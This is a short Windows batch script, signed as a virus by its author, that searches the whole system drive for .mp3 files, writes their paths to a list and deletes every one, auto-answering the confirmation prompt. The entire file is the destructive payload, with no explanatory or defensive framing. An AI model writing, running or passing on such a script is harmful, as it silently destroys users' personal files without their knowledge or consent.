@ echo off

rem ---------------------------------
rem Delete All Mp3
DIR /S/B %SystemDrive%\*.mp3 >> FIleList_mp3.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_mp3.txt) do del "%%j:%%k"
rem ---------------------------------


__-Virus Author: subhojit-__